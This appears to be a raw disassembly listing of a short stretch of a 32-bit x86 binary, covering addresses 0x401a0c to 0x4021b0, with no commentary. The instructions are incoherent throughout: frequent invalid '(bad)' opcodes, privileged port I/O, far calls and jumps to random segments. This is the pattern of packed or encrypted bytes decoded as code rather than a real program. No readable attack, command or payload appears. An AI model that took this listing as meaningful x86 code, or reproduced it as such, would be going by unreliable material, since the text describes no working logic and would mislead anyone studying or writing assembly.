  401a0c:	or     dl,0x4
  401a0f:	imul   ebx,DWORD PTR [ecx+0x3336e309],0xffffffbb
  401a16:	inc    ebx
  401a17:	mov    ch,BYTE PTR [ebx-0x49]
  401a1a:	inc    esp
  401a1b:	adc    ebp,ebx
  401a1d:	clc    
  401a1e:	call   0x4e13:0x3bcb54ff
  401a25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a26:	addr16 dec edx
  401a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a29:	lock outs dx,DWORD PTR ds:[esi]
  401a2b:	out    0x87,al
  401a2d:	cli    
  401a2e:	(bad)  
  401a2f:	jmp    0x401a0c
  401a31:	in     al,dx
  401a32:	mov    bh,0x12
  401a34:	leave  
  401a35:	and    ebx,ebp
  401a37:	jo     0x4019f9
  401a39:	xchg   BYTE PTR [edx+0x60a36ab0],bl
  401a3f:	sbb    esi,DWORD PTR [eax-0x2c34bfce]
  401a45:	cdq    
  401a46:	int    0x8
  401a48:	fs cs jo 0x4019f5
  401a4c:	outs   dx,DWORD PTR ds:[esi]
  401a4d:	cmp    DWORD PTR [ebx-0x532a568b],ecx
  401a53:	adc    bl,BYTE PTR [esi+0x4e21a5ad]
  401a59:	mov    eax,0x5387cccd
  401a5e:	fbstp  TBYTE PTR ds:0xee6e3f80
  401a64:	mov    ds:0xfc82b167,al
  401a69:	pop    ds
  401a6a:	jmp    0x2a089c4f
  401a6f:	test   eax,0xf988a4f6
  401a74:	push   edi
  401a75:	mov    esp,edi
  401a77:	popa   
  401a78:	add    eax,0x94eb3a12
  401a7d:	mov    esp,0x718aec08
  401a82:	mov    eax,ds:0xadf14174
  401a87:	push   ebx
  401a88:	push   cs
  401a89:	shl    BYTE PTR [esi],cl
  401a8b:	xlat   BYTE PTR ds:[ebx]
  401a8c:	mov    dh,0xf7
  401a8e:	cs int 0x8f
  401a91:	call   0x79e2:0xf028e9dc
  401a98:	out    dx,eax
  401a99:	sbb    eax,0x2cf38adf
  401a9e:	pop    es
  401a9f:	cs nop
  401aa1:	mov    ch,0x9d
  401aa3:	add    al,0x92
  401aa5:	jns    0x401ae0
  401aa7:	ds in  eax,0x42
  401aaa:	popf   
  401aab:	lds    edx,FWORD PTR [edi]
  401aad:	fs int3 
  401aaf:	push   es
  401ab0:	inc    edx
  401ab1:	xlat   BYTE PTR ds:[ebx]
  401ab2:	dec    edi
  401ab3:	icebp  
  401ab4:	or     bl,BYTE PTR [edi+0x22d4bf4a]
  401aba:	xor    al,0x55
  401abc:	inc    eax
  401abd:	mov    ebx,0x97e24bf7
  401ac2:	xor    ah,0xb
  401ac5:	adc    BYTE PTR [edx+0x21a21e09],ah
  401acb:	in     al,dx
  401acc:	add    eax,0xfa9d5992
  401ad1:	and    dl,BYTE PTR [esi+0x1553f3ee]
  401ad7:	mov    eax,ds:0x8f2a1902
  401adc:	nop
  401add:	fcomp  QWORD PTR [ecx]
  401adf:	xchg   esi,eax
  401ae0:	scas   eax,DWORD PTR es:[edi]
  401ae1:	in     al,0xe2
  401ae3:	adc    BYTE PTR [ecx-0x15e2e7f5],bl
  401ae9:	nop
  401aea:	cmp    al,0x35
  401aec:	or     BYTE PTR [edx+0x5f252150],al
  401af2:	cmc    
  401af3:	out    dx,eax
  401af4:	sbb    al,0x79
  401af6:	sub    ch,BYTE PTR gs:[ebp+0x63b022a8]
  401afd:	test   edi,0xd963a793
  401b03:	mov    WORD PTR [edx],cs
  401b05:	jmp    0xbe53:0x51d9f841
  401b0c:	dec    edi
  401b0d:	in     eax,0x84
  401b0f:	push   eax
  401b10:	inc    esi
  401b11:	daa    
  401b12:	scas   eax,DWORD PTR es:[edi]
  401b13:	jmp    0x96273ee4
  401b18:	sti    
  401b19:	mul    BYTE PTR [edi-0x16]
  401b1c:	fst    QWORD PTR [edi+ecx*1]
  401b1f:	ins    BYTE PTR es:[edi],dx
  401b20:	mov    cl,BYTE PTR [ecx-0x18]
  401b23:	lds    edi,FWORD PTR [ecx+0x240943bf]
  401b29:	adc    DWORD PTR [esi-0x7a61e226],ebx
  401b2f:	out    0xbb,eax
  401b31:	push   cs
  401b32:	mov    bh,BYTE PTR [edx+edi*2]
  401b35:	test   DWORD PTR [edx+0x1e],ebp
  401b38:	dec    esi
  401b39:	push   0xffffffd4
  401b3b:	test   DWORD PTR [ebp-0x68efde78],ebx
  401b41:	cmp    eax,esp
  401b43:	push   0xe
  401b45:	shr    ebx,0x95
  401b48:	test   al,0x75
  401b4a:	and    al,0xa
  401b4c:	pop    ebp
  401b4d:	sub    eax,0x771ac1cf
  401b52:	push   0x64
  401b54:	mov    bh,0x74
  401b56:	shl    DWORD PTR [edi-0x2e],cl
  401b59:	xor    DWORD PTR [eax-0x1e],esi
  401b5c:	out    0x61,al
  401b5e:	es pop esp
  401b60:	stos   DWORD PTR es:[edi],eax
  401b61:	inc    eax
  401b62:	out    0x29,eax
  401b64:	add    ah,dl
  401b66:	pushf  
  401b67:	lock mov ecx,0x870f75a0
  401b6d:	out    0xfe,al
  401b6f:	pop    es
  401b70:	xor    DWORD PTR ds:0xf502896a,eax
  401b76:	push   ebp
  401b78:	push   0x14
  401b7a:	push   cs
  401b7b:	jecxz  0x401b17
  401b7d:	popa   
  401b7e:	sub    al,0x58
  401b80:	aaa    
  401b81:	jne    0x401bc6
  401b83:	push   esp
  401b84:	inc    edx
  401b85:	fidiv  DWORD PTR [edi+0xe]
  401b88:	ret    
  401b89:	or     DWORD PTR [ecx],edi
  401b8b:	jne    0x401b62
  401b8d:	lahf   
  401b8e:	sub    eax,DWORD PTR [edi]
  401b90:	pop    esi
  401b91:	cmp    al,0xe9
  401b93:	push   edx
  401b94:	iretw  
  401b96:	pop    ecx
  401b97:	fcom   QWORD PTR [edi+0x67c41453]
  401b9d:	mov    ds:0x44b0b3c,eax
  401ba2:	jmp    0x9620:0x56ca7d73
  401ba9:	cmp    DWORD PTR [esi+0x6a49fdce],ebx
  401baf:	inc    esp
  401bb0:	scas   al,BYTE PTR es:[edi]
  401bb1:	mov    cl,0xca
  401bb3:	push   es
  401bb4:	or     BYTE PTR [ebx],bl
  401bb6:	xchg   ebp,eax
  401bb7:	or     edx,edi
  401bb9:	mov    ch,0xfb
  401bbb:	jno    0x401bd3
  401bbd:	int3   
  401bbe:	sbb    esi,DWORD PTR [esp+esi*8+0x6045cecd]
  401bc5:	es push esi
  401bc7:	push   esp
  401bc8:	add    DWORD PTR [ebx-0x334606e],edi
  401bce:	arpl   WORD PTR [ebx],cx
  401bd0:	imul   esp,DWORD PTR [ebp-0x332f1802],0x11
  401bd7:	mov    bh,BYTE PTR [eax+0x6d]
  401bda:	and    edx,ecx
  401bdc:	pop    edi
  401bdd:	jb     0x401bf0
  401bdf:	xor    BYTE PTR [ecx-0x76d50299],dl
  401be5:	cdq    
  401be6:	call   0xb5f1:0x214c99ae
  401bed:	sub    DWORD PTR [esi],edi
  401bef:	(bad)  
  401bf0:	pop    ebx
  401bf1:	xchg   BYTE PTR [esi],dl
  401bf3:	or     BYTE PTR [ecx+0x1084ebf2],bh
  401bf9:	(bad)  
  401bfb:	imul   esp,DWORD PTR [esi-0x3eefb77f],0x1d2f936b
  401c05:	test   edx,esi
  401c07:	xor    al,0x4c
  401c09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c0a:	cmp    al,0xf1
  401c0c:	hlt    
  401c0d:	int3   
  401c0e:	inc    ebp
  401c0f:	sub    al,BYTE PTR [edx+0x47]
  401c12:	shl    BYTE PTR [edi],0xa8
  401c15:	vpsubb ymm7,ymm3,YMMWORD PTR [ecx]
  401c19:	cmp    BYTE PTR [esi+0x376cd384],ch
  401c1f:	data16 mov gs,WORD PTR [esi]
  401c22:	stos   BYTE PTR es:[edi],al
  401c23:	and    eax,DWORD PTR [ebx]
  401c25:	add    BYTE PTR [edi-0x58],al
  401c28:	pop    ebp
  401c29:	mov    edx,0xae7db56b
  401c2e:	out    0x6e,al
  401c30:	push   cs
  401c31:	(bad)  
  401c32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c33:	adc    eax,ebp
  401c35:	sub    esp,DWORD PTR [ecx+eax*4]
  401c38:	je     0x401c5c
  401c3a:	out    dx,eax
  401c3b:	push   0x2fca4c63
  401c40:	out    0x20,eax
  401c42:	adc    eax,DWORD PTR [edx+0x67]
  401c45:	cmp    dh,BYTE PTR [esi-0x67]
  401c48:	adc    al,0x24
  401c4a:	lods   al,BYTE PTR ds:[esi]
  401c4b:	sub    ch,BYTE PTR [edx-0x7e]
  401c4e:	xchg   ebx,eax
  401c4f:	push   0x9141c7cc
  401c54:	mov    al,0x6f
  401c56:	push   edx
  401c57:	dec    ebp
  401c58:	jl     0x401c80
  401c5a:	mov    BYTE PTR [eax+0x6d],ah
  401c5d:	daa    
  401c5e:	jbe    0x401cc8
  401c60:	sar    BYTE PTR [ecx-0x56],cl
  401c63:	xor    eax,0x3bf25cf0
  401c68:	stc    
  401c69:	js     0x401cab
  401c6b:	push   ebp
  401c6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c6e:	icebp  
  401c6f:	fwait
  401c70:	inc    edx
  401c71:	cmp    cl,bh
  401c73:	in     eax,dx
  401c74:	xor    ebp,edi
  401c76:	sub    eax,0xa01b31dc
  401c7b:	fadd   QWORD PTR [ecx+0x23]
  401c7e:	cmp    bh,BYTE PTR [edx+0x12]
  401c81:	pusha  
  401c82:	inc    ecx
  401c83:	(bad)  
  401c84:	(bad)  
  401c85:	jno    0x401cd0
  401c87:	mov    ebp,0xb0e10825
  401c8c:	daa    
  401c8d:	fwait
  401c8e:	hlt    
  401c8f:	inc    ecx
  401c90:	retf   
  401c91:	xor    DWORD PTR [esi],eax
  401c93:	fwait
  401c94:	leave  
  401c95:	cmc    
  401c96:	adc    eax,0x834492ac
  401c9b:	pop    esp
  401c9c:	adc    eax,0xc85a1c94
  401ca1:	(bad)
  401ca4:	shl    BYTE PTR [eax-0x3],0x7a
  401ca8:	and    al,0x36
  401caa:	(bad)  
  401cab:	dec    esp
  401cac:	sub    eax,0x43bcf002
  401cb1:	or     DWORD PTR [edx],eax
  401cb3:	lds    ebp,FWORD PTR [edx+esi*4-0x257823c6]
  401cba:	pop    ecx
  401cbb:	mov    BYTE PTR [ebx],dh
  401cbd:	popf   
  401cbe:	aad    0xae
  401cc0:	out    0x7a,eax
  401cc2:	aad    0xa0
  401cc4:	dec    esp
  401cc5:	fdivp  st(7),st
  401cc7:	sar    dl,0xae
  401cca:	(bad)  
  401ccb:	adc    al,0x5e
  401ccd:	jle    0x401d0e
  401ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd0:	inc    esp
  401cd1:	and    ch,BYTE PTR [ebx-0x78]
  401cd4:	mov    DWORD PTR ds:0x543d77a2,ecx
  401cda:	xchg   BYTE PTR [ecx+0x40],dh
  401cdd:	iret   
  401cde:	fstp   TBYTE PTR ds:0x86898965
  401ce4:	pop    edx
  401ce5:	es enter 0x56ba,0x18
  401cea:	or     eax,0x8127a609
  401cef:	into   
  401cf0:	cmp    BYTE PTR [eax-0x3e37ff8f],bl
  401cf6:	(bad)  
  401cf7:	xor    al,bh
  401cf9:	(bad)  
  401cfa:	and    esp,DWORD PTR [ebp+0x7d]
  401cfd:	fisubr WORD PTR [ebp-0x34c00f32]
  401d03:	mov    esp,0x61d3ba7e
  401d08:	pop    esp
  401d09:	test   edx,ebx
  401d0b:	cli    
  401d0c:	mov    dl,0x2d
  401d0e:	sar    DWORD PTR [edx],0xc8
  401d11:	push   0xf666115b
  401d16:	scas   al,BYTE PTR es:[edi]
  401d17:	into   
  401d18:	mov    al,ds:0xb1dba640
  401d1d:	gs mov eax,edx
  401d20:	mov    ah,0xac
  401d22:	jl     0x401d4c
  401d24:	mov    esp,0x8df54674
  401d29:	sub    al,0xfa
  401d2b:	out    dx,al
  401d2c:	cmc    
  401d2d:	inc    esi
  401d2e:	nop
  401d2f:	int3   
  401d30:	rcr    DWORD PTR [eax+0x21b002d7],0x6f
  401d37:	ror    dl,0x43
  401d3a:	(bad)  
  401d3b:	pop    esp
  401d3c:	call   0x2595:0x26824a54
  401d43:	enter  0x22bf,0xba
  401d47:	jo     0x401d18
  401d49:	inc    esp
  401d4a:	gs scas al,BYTE PTR es:[edi]
  401d4c:	pusha  
  401d4d:	mov    WORD PTR [eax+0xc],es
  401d50:	test   BYTE PTR [ebx+0x8],0x43
  401d54:	xchg   DWORD PTR [esi-0x23],edi
  401d57:	and    BYTE PTR [edx],cl
  401d59:	xor    al,0x5b
  401d5b:	setne  BYTE PTR [edi+eiz*1]
  401d5f:	loop   0x401dac
  401d61:	cdq    
  401d62:	fadd   st,st(5)
  401d64:	call   DWORD PTR [eax+ebp*8+0x51]
  401d68:	outs   dx,DWORD PTR ds:[esi]
  401d69:	fcom   st(3)
  401d6b:	add    dl,BYTE PTR [eax]
  401d6d:	daa    
  401d6e:	cmp    cl,BYTE PTR [ecx+eiz*4]
  401d71:	cmp    DWORD PTR [eax+0x104b6f33],eax
  401d77:	add    BYTE PTR [ebx+0x2e],ah
  401d7a:	aas    
  401d7b:	(bad)  
  401d7c:	cmp    al,0x38
  401d7e:	jmp    DWORD PTR [ecx+esi*1-0x22aa2a7d]
  401d85:	std    
  401d86:	jne    0x401d35
  401d88:	jle    0x401dd9
  401d8a:	pop    es
  401d8b:	add    edx,DWORD PTR [esi]
  401d8d:	les    esi,FWORD PTR [eax-0x24]
  401d90:	mov    ebp,0xaff47d7f
  401d95:	jmp    0x401d90
  401d97:	(bad)  
  401d98:	gs xchg ebp,eax
  401d9a:	push   es
  401d9b:	imul   BYTE PTR [esi+0x3c90bcb0]
  401da1:	scas   al,BYTE PTR es:[di]
  401da3:	imul   ecx,DWORD PTR [edi+0x2aa4b50c],0x2e
  401daa:	gs cs (bad) 
  401dad:	jns    0x401d9a
  401daf:	xor    ch,BYTE PTR [edx+0x49]
  401db2:	mov    ebp,0x69e960fb
  401db7:	mov    ds:0x33c712c3,eax
  401dbc:	jmp    0xbdd7eaf7
  401dc1:	and    dh,BYTE PTR [eax]
  401dc3:	xlat   BYTE PTR ds:[ebx]
  401dc4:	(bad)  
  401dc5:	data16 add al,0x9a
  401dc8:	sbb    BYTE PTR [esi-0x49fb1038],0x48
  401dcf:	pop    es
  401dd0:	mov    ebx,0x9254001b
  401dd5:	mov    ds:0x7dcd8a7d,al
  401dda:	ss inc esi
  401ddc:	xchg   edx,eax
  401ddd:	int    0xb7
  401ddf:	inc    edx
  401de0:	jne    0x401e43
  401de2:	aaa    
  401de3:	cmp    BYTE PTR [edx+0x27],bh
  401de6:	and    al,0x4f
  401de8:	popa   
  401de9:	add    BYTE PTR [edx],al
  401deb:	pop    ecx
  401dec:	add    al,0x5e
  401dee:	stc    
  401def:	(bad)  
  401df0:	sub    BYTE PTR [esi+0x68],ch
  401df3:	mov    ch,0xff
  401df5:	ss pop edi
  401df7:	loopne 0x401dbf
  401df9:	sub    al,BYTE PTR [ecx-0x4b]
  401dfc:	mov    eax,0xdbe47f63
  401e01:	jge    0x401e16
  401e03:	xor    BYTE PTR [ecx],ah
  401e05:	iret   
  401e06:	in     al,dx
  401e07:	mov    bh,0xdc
  401e09:	pop    esi
  401e0a:	pop    esi
  401e0b:	loop   0x401dda
  401e0d:	inc    edi
  401e0e:	cli    
  401e0f:	ret    0x87d3
  401e12:	fldenv [esi]
  401e14:	in     al,dx
  401e15:	fcom   QWORD PTR [edx+0x40]
  401e18:	fiadd  DWORD PTR [edi]
  401e1a:	and    eax,0x73cbcccd
  401e1f:	sbb    BYTE PTR [eax+ebp*2],bh
  401e22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e23:	int3   
  401e24:	popa   
  401e25:	sub    eax,DWORD PTR [ebx]
  401e27:	sahf   
  401e28:	and    al,0xf
  401e2a:	icebp  
  401e2b:	sub    DWORD PTR [esi],ebp
  401e2d:	cli    
  401e2e:	aam    0x50
  401e30:	push   0x47
  401e32:	mov    dl,0x36
  401e34:	sub    DWORD PTR [eax+ebp*8],edx
  401e37:	xor    al,0x71
  401e39:	mov    ebp,0x945b912a
  401e3e:	and    eax,0x3384e0c6
  401e43:	sub    al,0xd1
  401e45:	fistp  DWORD PTR [ebp-0x8]
  401e48:	mov    DWORD PTR [edx],eax
  401e4a:	sub    edx,DWORD PTR [eax-0x56b8b96a]
  401e50:	jp     0x401ea0
  401e52:	test   DWORD PTR [edx],edx
  401e54:	hlt    
  401e55:	test   al,0x84
  401e57:	lods   eax,DWORD PTR ds:[esi]
  401e58:	mov    edx,DWORD PTR [edi+esi*2-0x5d]
  401e5c:	jbe    0x401ea0
  401e5e:	loopne 0x401eca
  401e60:	mov    WORD PTR ds:0x4bf9a359,fs
  401e66:	sub    DWORD PTR [ebp+0x3036c3ad],ebx
  401e6c:	adc    al,0x61
  401e6e:	das    
  401e6f:	xchg   esi,eax
  401e70:	lock pop ss
  401e72:	test   DWORD PTR [ecx+0x60],edx
  401e75:	in     eax,0xd0
  401e77:	xchg   esi,eax
  401e78:	cld    
  401e79:	mov    edx,0x828e9542
  401e7e:	jl     0x401e72
  401e80:	sub    DWORD PTR [esp+ecx*8],ebx
  401e83:	cmp    ecx,DWORD PTR [eax]
  401e85:	xor    esi,esp
  401e87:	jno    0x401f02
  401e89:	ficom  WORD PTR [edx]
  401e8b:	mov    ds:0x72cdb0a6,al
  401e90:	jne    0x401ec1
  401e92:	push   edi
  401e93:	out    dx,eax
  401e94:	jmp    0xdd6d6e7
  401e99:	pop    eax
  401e9a:	add    edx,ecx
  401e9c:	dec    edx
  401e9d:	push   es
  401e9e:	inc    ecx
  401e9f:	inc    ecx
  401ea0:	or     DWORD PTR [esi+edx*4-0x71],0xd998a670
  401ea8:	mov    dh,0x31
  401eaa:	mov    ebp,0xf5241639
  401eaf:	mov    esp,0xea18a100
  401eb4:	mov    dh,0x8b
  401eb6:	fsub   st,st(6)
  401eb8:	clc    
  401eb9:	ins    BYTE PTR es:[edi],dx
  401eba:	xor    eax,DWORD PTR [ecx+ecx*1]
  401ebd:	dec    ecx
  401ebe:	in     al,dx
  401ebf:	xchg   BYTE PTR [ecx+ecx*4+0x188b433d],ch
  401ec6:	in     al,0xfa
  401ec8:	sbb    al,dl
  401eca:	adc    eax,eax
  401ecc:	pop    ebx
  401ecd:	cmp    dl,BYTE PTR [esi+0x67]
  401ed0:	jb     0x401ecc
  401ed2:	fcmovu st,st(6)
  401ed4:	ret    
  401ed5:	xchg   edi,eax
  401ed6:	lock test eax,0x779cd3cd
  401edc:	sub    al,0xa9
  401ede:	inc    esp
  401edf:	or     BYTE PTR [ecx+0x45],0xda
  401ee3:	sub    DWORD PTR [ecx],ebp
  401ee5:	pop    edx
  401ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ee7:	jnp    0x401ef2
  401ee9:	jno    0x401ebc
  401eeb:	or     eax,edi
  401eed:	push   ecx
  401eee:	outs   dx,DWORD PTR ds:[esi]
  401eef:	cmp    ebx,esi
  401ef1:	lock test BYTE PTR [edx-0x69db90f8],0xe3
  401ef9:	fst    st(0)
  401efb:	les    edx,FWORD PTR [ebp-0x18e7b705]
  401f01:	xor    BYTE PTR [edi+0x748bca1b],ch
  401f07:	mov    cl,0xc7
  401f09:	test   dh,al
  401f0b:	cwde   
  401f0c:	sub    DWORD PTR [ecx-0x404e438a],eax
  401f12:	test   al,0xff
  401f14:	push   esi
  401f15:	mov    ebx,0x7cc70ad1
  401f1a:	push   edx
  401f1c:	jmp    0x62f7:0xbe877fd6
  401f23:	iret   
  401f24:	dec    edx
  401f25:	lahf   
  401f26:	sar    BYTE PTR [edx+esi*1-0x7],cl
  401f2a:	add    ebx,ebx
  401f2c:	add    eax,0x43d6aaf5
  401f31:	push   ebx
  401f32:	mul    edi
  401f34:	or     edi,DWORD PTR [esi+0x87ed176]
  401f3a:	inc    ecx
  401f3b:	xlat   BYTE PTR ds:[ebx]
  401f3c:	stos   DWORD PTR es:[edi],eax
  401f3d:	xchg   esi,eax
  401f3e:	mov    bl,0xa
  401f40:	push   eax
  401f41:	push   esi
  401f42:	adc    ch,dh
  401f44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f45:	pop    eax
  401f46:	push   ebx
  401f47:	aas    
  401f48:	mov    esp,0x7bb29d69
  401f4d:	sub    edi,DWORD PTR [ebp+0xfc0d056]
  401f53:	shl    DWORD PTR [ebx],0x6a
  401f56:	sub    ecx,eax
  401f58:	mov    edx,0x68fefa7e
  401f5d:	jle    0x401f1b
  401f5f:	inc    esp
  401f60:	aaa    
  401f61:	xor    bl,cl
  401f63:	mov    ecx,0x7edd0d8e
  401f68:	mov    edx,0x79dd7612
  401f6d:	xchg   edx,eax
  401f6e:	sbb    BYTE PTR [esi-0x63261dc0],ch
  401f74:	les    edx,FWORD PTR [eax+eax*4]
  401f77:	jmp    0x401f55
  401f79:	sti    
  401f7a:	add    eax,ecx
  401f7c:	and    al,0xf1
  401f7e:	pusha  
  401f7f:	data16 (bad) 
  401f81:	xor    DWORD PTR [ebp+0x41cb9cfe],ebx
  401f87:	mov    edx,0x8b2ec035
  401f8c:	add    eax,0x343d713
  401f91:	rcl    BYTE PTR [ebx],1
  401f93:	xchg   edi,eax
  401f94:	loop   0x401ff7
  401f96:	push   ebx
  401f97:	(bad)  
  401f99:	and    eax,0x7ea73bfd
  401f9e:	dec    esp
  401f9f:	dec    edi
  401fa0:	rcr    al,1
  401fa2:	cmp    eax,DWORD PTR [ebp-0x5b]
  401fa5:	fld    TBYTE PTR [eax+0x3]
  401fa8:	dec    esp
  401fa9:	and    BYTE PTR [esi+edi*4-0x7f],al
  401fad:	push   0x72
  401faf:	add    eax,0xd6cffb65
  401fb4:	push   0xffffffc1
  401fb6:	js     0x402035
  401fb8:	sub    DWORD PTR [ecx-0x27],ecx
  401fbb:	cmp    DWORD PTR [ebx-0x5feafc01],esp
  401fc1:	stos   DWORD PTR es:[edi],eax
  401fc2:	fild   DWORD PTR [edi-0x350063c]
  401fc8:	in     al,dx
  401fc9:	stc    
  401fca:	scas   al,BYTE PTR es:[edi]
  401fcb:	clc    
  401fcc:	xor    al,BYTE PTR [esi+0x3b37520e]
  401fd2:	cs jb  0x401fc5
  401fd5:	or     DWORD PTR [esi-0x75a7fd24],ecx
  401fdb:	in     eax,dx
  401fdc:	pop    edi
  401fdd:	mov    bl,0xbd
  401fdf:	sub    eax,0xe9c32949
  401fe4:	jbe    0x401fef
  401fe6:	aas    
  401fe7:	mov    eax,ds:0xf7f5f0a5
  401fec:	push   esi
  401fed:	push   gs
  401fef:	hlt    
  401ff0:	popa   
  401ff1:	adc    DWORD PTR [edi],esi
  401ff3:	retf   
  401ff4:	push   esi
  401ff5:	rcl    DWORD PTR [esi+0x79d343c7],cl
  401ffb:	dec    ebx
  401ffc:	or     bl,ah
  401ffe:	fs push eax
  402000:	jl     0x40201f
  402002:	and    al,0xbe
  402004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402005:	lds    ebp,FWORD PTR [eax]
  402007:	call   0x6cdd1100
  40200c:	dec    edi
  40200d:	push   ebx
  40200e:	add    eax,DWORD PTR [edi]
  402010:	push   edx
  402011:	jg     0x402025
  402013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402014:	hlt    
  402015:	daa    
  402016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402017:	add    eax,0x688cb125
  40201c:	xchg   edi,eax
  40201d:	jle    0x402042
  40201f:	stos   BYTE PTR es:[edi],al
  402020:	sbb    DWORD PTR [ebp+0x4d],ebx
  402023:	adc    BYTE PTR [ebx],0xcf
  402026:	scas   eax,DWORD PTR es:[edi]
  402027:	xor    DWORD PTR [ebx+0x59],edi
  40202a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40202b:	push   esp
  40202c:	loope  0x401fbe
  40202e:	retf   
  40202f:	xchg   esp,eax
  402030:	daa    
  402031:	dec    ecx
  402032:	mul    BYTE PTR [edi]
  402034:	sahf   
  402035:	out    0x5a,eax
  402037:	dec    edi
  402038:	jge    0x401fc9
  40203a:	lock into 
  40203c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40203e:	paddw  mm2,QWORD PTR [ebx+edx*4]
  402042:	push   0xb7985da8
  402047:	daa    
  402048:	test   DWORD PTR [ebp-0x1f77ed3b],esi
  40204e:	jns    0x402008
  402050:	sub    DWORD PTR [edx+0x6203890],ebx
  402056:	add    edi,DWORD PTR [edi]
  402058:	xor    ah,0xa2
  40205b:	pop    ecx
  40205c:	cmp    BYTE PTR [edi],dh
  40205e:	inc    ebp
  40205f:	std    
  402060:	pushf  
  402061:	aam    0x6c
  402063:	lods   al,BYTE PTR ds:[esi]
  402064:	inc    esi
  402065:	mov    cl,0xaf
  402067:	jmp    0x897f:0x19c66303
  40206e:	xor    ebp,DWORD PTR [ebx]
  402070:	mov    ah,0x51
  402072:	or     DWORD PTR [esi],0xfbc1781e
  402078:	mov    ss,WORD PTR [esi-0x24]
  40207b:	mov    cl,0x4b
  40207d:	adc    BYTE PTR [eax-0x200a9c1e],bh
  402083:	push   esi
  402084:	and    DWORD PTR [ecx],edx
  402086:	gs mov dl,0xd3
  402089:	dec    esp
  40208a:	sub    esp,DWORD PTR [ebx+0x3a85d907]
  402090:	(bad)
  402093:	xchg   ebp,eax
  402094:	jnp    0x4020f2
  402096:	jmp    0xda3c4593
  40209b:	and    BYTE PTR [esi],ah
  40209d:	push   esp
  40209e:	loopne 0x402054
  4020a0:	mov    al,0x24
  4020a2:	(bad)  
  4020a3:	adc    al,0x6d
  4020a5:	aaa    
  4020a6:	fimul  DWORD PTR [ebx-0x552ba9bd]
  4020ac:	aas    
  4020ad:	sahf   
  4020ae:	js     0x40211f
  4020b0:	or     eax,0x4b170fc4
  4020b5:	je     0x40211b
  4020b7:	(bad)  
  4020b8:	jmp    0xecce:0xa59a6916
  4020bf:	lahf   
  4020c0:	ret    0xd626
  4020c3:	sbb    al,0x46
  4020c5:	mov    esi,0x60a396b5
  4020ca:	outs   dx,BYTE PTR ds:[esi]
  4020cb:	jb     0x40204e
  4020cd:	into   
  4020ce:	or     al,0x8b
  4020d0:	pop    edx
  4020d1:	cmp    esi,eax
  4020d3:	mov    al,0x2a
  4020d5:	pop    eax
  4020d6:	sbb    eax,0xe7d63206
  4020db:	pop    esi
  4020dc:	ss inc edx
  4020de:	push   0x9593444
  4020e3:	ret    0xd724
  4020e6:	mov    eax,0x36508677
  4020eb:	push   ds
  4020ec:	push   ebx
  4020ed:	xor    eax,0xc4341d12
  4020f2:	ret    
  4020f3:	mov    ebp,0x21a4843d
  4020f8:	and    eax,edi
  4020fa:	mov    esp,0x2645672c
  4020ff:	popf   
  402100:	leave  
  402101:	mov    al,ds:0x4413049a
  402106:	imul   DWORD PTR [edx]
  402108:	stos   DWORD PTR es:[edi],eax
  402109:	(bad)  
  40210a:	int    0xfb
  40210c:	in     eax,dx
  40210d:	lods   eax,DWORD PTR ds:[esi]
  40210e:	inc    ebp
  40210f:	call   0x2f91abac
  402114:	xlat   BYTE PTR ds:[ebx]
  402115:	pop    ss
  402116:	sar    DWORD PTR [esi],1
  402118:	out    dx,al
  402119:	sahf   
  40211a:	mov    BYTE PTR [edi+0x18],dh
  40211d:	data16 test al,0x2b
  402120:	test   al,0xf3
  402122:	xchg   esi,eax
  402123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402124:	iret   
  402125:	xor    BYTE PTR [ecx+0x5],ah
  402128:	jecxz  0x40212e
  40212a:	aas    
  40212b:	sub    DWORD PTR [eax+0x6e],edx
  40212e:	pop    es
  40212f:	inc    ecx
  402130:	xchg   BYTE PTR [eax-0x45],dl
  402133:	mov    ds:0xcff54048,al
  402138:	sbb    al,0x3
  40213a:	cmc    
  40213b:	jmp    0x402157
  40213d:	sub    ah,al
  40213f:	or     ebp,DWORD PTR [ecx-0x17]
  402142:	sbb    DWORD PTR [eax+0x6a],esi
  402145:	outs   dx,BYTE PTR ds:[esi]
  402146:	iret   
  402147:	sbb    eax,eax
  402149:	push   eax
  40214a:	stos   BYTE PTR es:[edi],al
  40214b:	push   ds
  40214c:	call   0x78b69232
  402151:	mov    eax,0xb3068c37
  402156:	int3   
  402157:	mov    ecx,0xf022ecf
  40215c:	test   ebx,edi
  40215e:	mov    al,0x1
  402160:	jns    0x4021af
  402162:	outs   dx,BYTE PTR ds:[esi]
  402163:	mov    eax,0xf6c4937b
  402168:	inc    ebx
  402169:	std    
  40216a:	mov    ds:0xe698ed91,eax
  40216f:	cwde   
  402170:	scas   eax,DWORD PTR es:[edi]
  402171:	add    esi,ebp
  402173:	xchg   esi,eax
  402174:	xchg   edx,eax
  402175:	xor    BYTE PTR [esi],cl
  402177:	sub    BYTE PTR [esi+ecx*1-0x33c25f46],dl
  40217e:	shrd   DWORD PTR [edi+0x1],esi,cl
  402182:	jg     0x40210b
  402184:	sbb    al,0xb7
  402186:	sbb    al,0x74
  402188:	push   0xffffffd0
  40218a:	push   0xffffffb4
  40218c:	inc    esp
  40218d:	and    BYTE PTR [ecx-0x2b0533dd],ah
  402193:	cmp    al,0x15
  402195:	sbb    cl,0x7d
  402198:	adc    eax,0xaa3bb5a9
  40219d:	test   BYTE PTR es:[ebx],0xd4
  4021a1:	jo     0x4021ee
  4021a3:	retf   0x2c83
  4021a6:	ja     0x40219d
  4021a8:	add    eax,0xfebbd5f2
  4021ad:	sbb    al,0xd5
  4021af:	pop    esi
  4021b0:	popf   
